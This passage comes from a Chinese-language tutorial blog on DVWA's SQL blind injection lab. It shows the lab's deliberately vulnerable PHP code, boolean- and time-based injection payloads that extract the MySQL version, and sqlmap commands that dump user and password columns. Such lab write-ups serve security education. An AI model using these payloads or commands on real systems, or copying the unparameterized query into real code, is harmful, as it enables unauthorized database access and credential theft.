+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;Submit&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check database
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$getid</span>  <span class="o">=</span> <span class="s2">&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class="si">$id</span><span class="s2">&#39;;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span>  <span class="nv">$getid</span> <span class="p">);</span> <span class="c1">// Removed &#39;or die&#39; to suppress mysql errors
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$num</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_num_rows</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">);</span> <span class="c1">// The &#39;@&#39; character suppresses errors
+</span></span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span> <span class="nv">$num</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// User wasn&#39;t found, so the page wasn&#39;t!
+</span></span></span><span class="line"><span class="cl">		<span class="nx">header</span><span class="p">(</span> <span class="nv">$_SERVER</span><span class="p">[</span> <span class="s1">&#39;SERVER_PROTOCOL&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="s1">&#39; 404 Not Found&#39;</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="p">((</span><span class="nx">is_null</span><span class="p">(</span><span class="nv">$___mysqli_res</span> <span class="o">=</span> <span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])))</span> <span class="o">?</span> <span class="k">false</span> <span class="o">:</span> <span class="nv">$___mysqli_res</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">    
+</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">// 检查是否点击了提交按钮（例如，表单提交）
+</span></span></span><span class="line"><span class="cl"><span class="err">if( isset( $_GET[ &#39;Submit&#39; ] ) ) {
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    // 获取用户通过GET方式传递的ID值
+</span></span></span><span class="line"><span class="cl"><span class="err">    $id = $_GET[ &#39;id&#39; ];
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    // 创建SQL查询语句：根据$user_id查询users表中的first_name和last_name字段
+</span></span></span><span class="line"><span class="cl"><span class="err">    $getid  = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    // 执行SQL查询（假设$___mysqli_ston是全局的数据库连接对象）
+</span></span></span><span class="line"><span class="cl"><span class="err">    // 使用@字符抑制可能出现的MySQL错误信息
+</span></span></span><span class="line"><span class="cl"><span class="err">    $result = mysqli_query($GLOBALS[&#34;___mysqli_ston&#34;],  $getid );
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    // 获取查询结果中记录的数量
+</span></span></span><span class="line"><span class="cl"><span class="err">    $num = @mysqli_num_rows( $result );
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    // 判断查询结果中是否存在记录
+</span></span></span><span class="line"><span class="cl"><span class="err">    if( $num &gt; 0 ) {
+</span></span></span><span class="line"><span class="cl"><span class="err">        // 如果查询到至少一条记录，则输出反馈信息表示用户ID存在于数据库中
+</span></span></span><span class="line"><span class="cl"><span class="err">        $html .= &#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">    else {
+</span></span></span><span class="line"><span class="cl"><span class="err">        // 若未查询到任何记录，则发送HTTP 404状态码（页面未找到）
+</span></span></span><span class="line"><span class="cl"><span class="err">        header( $_SERVER[ &#39;SERVER_PROTOCOL&#39; ] . &#39; 404 Not Found&#39; );
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">        // 同时输出反馈信息表示用户ID在数据库中不存在
+</span></span></span><span class="line"><span class="cl"><span class="err">        $html .= &#39;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="err">    }
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">    // 关闭数据库连接
+</span></span></span><span class="line"><span class="cl"><span class="err">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[&#34;___mysqli_ston&#34;]))) ? false : $___mysqli_res);
+</span></span></span><span class="line"><span class="cl"><span class="err">}
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
+</span></span></span><span class="line"><span class="cl"><span class="err">// 从URL参数中获取一个id，然后查询数据库中是否存在对应这个id的用户。如果存在，它会在页面上显示&#34;User ID exists in the database.&#34;；如果不存在，则发送HTTP 404状态码并显示&#34;User ID is MISSING from the database.&#34;。
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>网页不会直接返回数据，而是返回特定信息。比如输入1，页面返回“User ID exists in the database.”，查询内容没有回显。</p>
+<p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424584.png" 
+             alt="image-20240508105954105" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<h3 id="布尔盲注">布尔盲注</h3>
+<blockquote>
+<p><strong>布尔盲注</strong> ：通过构造SQL查询使结果影响网页响应（如页面内容变化），从而通过真/假判断逐位推测数据库信息。</p>
+</blockquote>
+<p>1、判断注入类型</p>
+<p>注入以下语句，根据回显信息查询成功</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and 1=1#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424585.png" 
+             alt="image-20240508110618261" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>注入以下语句，根据回显信息查询失败。由此，判断此为字符型注入，并且需要单引号闭合。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and 1=2#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424586.png" 
+             alt="image-20240508111005482" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>2、获取版本号</p>
+<p>首先探测版本号的长度，使用substr函数提取返回的版本号字符串，用length函数获得版本号字符串的长度，判断与猜测长度&quot;1&quot;是否相等。返回查询不存在，说明版本号字符串长度不为猜测长度&quot;1&quot;。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and length(substr((select version()),1)) = 1 #
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">// VERSION()函数以字符串形式返回 MySQL 数据库的当前版本。
+</span></span><span class="line"><span class="cl">// length() 函数用于获取字符串的长度
+</span></span><span class="line"><span class="cl">// substr( string, start, length) 函数用于截取字符串 string，start 为起始位置，length 为长度。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424587.png" 
+             alt="image-20240508111726299" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>迭代查询语句，最后在猜测长度&quot;6&quot;返回查询存在，说明版本号字符串长度为6</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and length(substr((select version()),1)) = 6 #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424588.png" 
+             alt="image-20240508112420486" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>接下来获取版本号字符串的内容，MySql的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 <code>5.7.23</code> 。猜测第一个数字为’5’，注入以下语句，返回查询结果存在，说明第一个字符为’5’。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and substr((select version()),1,1) = &#39;5&#39;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424589.png" 
+             alt="image-20240508170141095" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>通过采用穷举的方法，逐步尝试输入0 ~ 9的数字以及&quot;.&ldquo;符号，来进行SQL盲注攻击。在这一过程中，每一次注入测试都是为了识别能够成功执行的SQL查询部分。最终，将得到的字符片段拼接起来，确定了MySQL数据库的版本号为“5.7.26”。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and substr((select version()),2,1) = &#39;.&#39;#
+</span></span><span class="line"><span class="cl">1&#39; and substr((select version()),3,1) = &#39;7&#39;#
+</span></span><span class="line"><span class="cl">1&#39; and substr((select version()),4,1) = &#39;.&#39;#
+</span></span><span class="line"><span class="cl">1&#39; and substr((select version()),5,1) = &#39;2&#39;#
+</span></span><span class="line"><span class="cl">1&#39; and substr((select version()),6,1) = &#39;6&#39;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="时间盲注">时间盲注</h3>
+<blockquote>
+<p><strong>时间盲注</strong> ：利用数据库延时函数（如 <code>SLEEP</code> ），根据响应时间长短推断SQL查询真伪，逐步获取数据库内容。</p>
+</blockquote>
+<p>1、判断注入类型</p>
+<p>注入以下语句，服务器响应时间很短，不足3秒，说明sleep()函数没有执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 and sleep(3) #
+</span></span><span class="line"><span class="cl">// SLEEP()函数是一个用于控制程序流程的函数，它能够让当前的SQL语句执行暂停一定的时间后再继续。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424590.png" 
+             alt="image-20240508174027495" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>注入以下语句，服务器响应时间达到3秒，说明sleep()函数执行，判断注入类型为字符型盲注。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and sleep(3) #
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424592.png" 
+             alt="image-20240508173801671" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>2、获取版本号</p>
+<p>注入以下语句，猜测版本号字符串的长度为1，服务器响应很快，说明sleep()函数没有执行。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and if(length(substr((select version()), 1)) = 1, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">// if(expr1,expr2,expr3) 语句，如果 expr1 的结果是 True，则返回 expr2，否则返回 expr3。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>依次测试到6时，可以感觉到服务器明显延迟，抓包发现响应时间大于3秒，说明版本号字符串长度为6。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and if(length(substr((select version()), 1)) = 6, sleep(3), 1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424593.png" 
+             alt="image-20240509091945541" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>接下来获取版本号字符串的内容，MySql 的版本号由三个数字部分和可选的后缀组成，用点(“.”)分隔各个部分，形如 <code>5.7.23</code> 。猜测第一个数字为’5’，注入以下语句，服务器响应时间大于三秒，说明第一个字符为’5’。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and if(substr((select version()), 1, 1) = &#39;5&#39;, sleep(3), 1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过采用穷举的方法，逐步尝试输入0 ~ 9的数字以及&rdquo;.&ldquo;符号，来进行SQL盲注攻击。在这一过程中，每一次注入测试都是为了识别能够成功执行的SQL查询部分。最终，将服务器有大于 3 秒的延迟的字符片段拼接起来，确定了MySQL数据库的版本号为“5.7.26”。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#39; and if(substr((select version()), 2, 1) = &#39;.&#39;, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1&#39; and if(substr((select version()), 3, 1) = &#39;7&#39;, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1&#39; and if(substr((select version()), 4, 1) = &#39;.&#39;, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1&#39; and if(substr((select version()), 5, 1) = &#39;2&#39;, sleep(3), 1)#
+</span></span><span class="line"><span class="cl">1&#39; and if(substr((select version()), 6, 1) = &#39;6&#39;, sleep(3), 1)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="sqlmap">sqlmap</h3>
+<p>1、判断注入点</p>
+<p>用sqlmap工具进行自动化注入，首先判断注入点，获取cookie值，拼接语句。爆破数据库名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch --dbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424594.png" 
+             alt="image-20240509092715089" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>得到数据库名后，选择dvwa数据库，爆破dvwa数据库下的表名。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch -D dvwa --tables
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424595.png" 
+             alt="image-20240509093153249" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>选择users数据表，查看users数据表有哪些字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch -D dvwa -T users --columns
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424596.png" 
+             alt="image-20240509093314608" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<p>选择users数据表下的user、password字段</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sqlmap -u &#34;http://dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&#34; --cookie &#34;PHPSESSID=psuncupdhgq2rj4lkp7jp1s1h3; security=low&#34; --batch -D dvwa -T users -C user,password --dump
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>
+<div class="post-img-view">
+    <a data-fancybox="gallery" href="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png">
+        <img src="https://cdn.jsdelivr.net/gh/yuexuan521/image/20251225165424597.png" 
+             alt="image-20240509093507168" 
+              
+             loading="lazy"
+        />
+    </a>
+</div></p>
+<h2 id="medium">Medium</h2>
+<p>0、分析网页源代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="nx">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;Submit&#39;</span> <span class="p">]</span>  <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get input
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;id&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//POST方式提交数据
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$id</span> <span class="o">=</span> <span class="p">((</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">is_object</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">]))</span> <span class="o">?</span> <span class="nx">mysqli_real_escape_string</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span>  <span class="nv">$id</span> <span class="p">)</span> <span class="o">:</span> <span class="p">((</span><span class="nx">trigger_error</span><span class="p">(</span><span class="s2">&#34;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&#34;</span><span class="p">,</span> <span class="nx">E_USER_ERROR</span><span class="p">))</span> <span class="o">?</span> <span class="s2">&#34;&#34;</span> <span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">//使用mysqli_real_escape_string()函数防范SQL注入
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Check database
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$getid</span>  <span class="o">=</span> <span class="s2">&#34;SELECT first_name, last_name FROM users WHERE user_id = </span><span class="si">$id</span><span class="s2">;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$result</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s2">&#34;___mysqli_ston&#34;</span><span class="p">],</span>  <span class="nv">$getid</span> <span class="p">);</span> <span class="c1">// Removed &#39;or die&#39; to suppress mysql errors
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Get results
+</span></span></span><span class="line"><span class="cl">	<span class="nv">$num</span> <span class="o">=</span> <span class="o">@</span><span class="nx">mysqli_num_rows</span><span class="p">(</span> <span class="nv">$result</span> <span class="p">);</span> <span class="c1">// The &#39;@&#39; character suppresses errors
+</span></span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span> <span class="nv">$num</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
+</span></span></span><span class="line"><span class="cl">		<span class="nv">$html</span> <span class="o">.=</span> <span class="s1">&#39;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// Feedback for end user
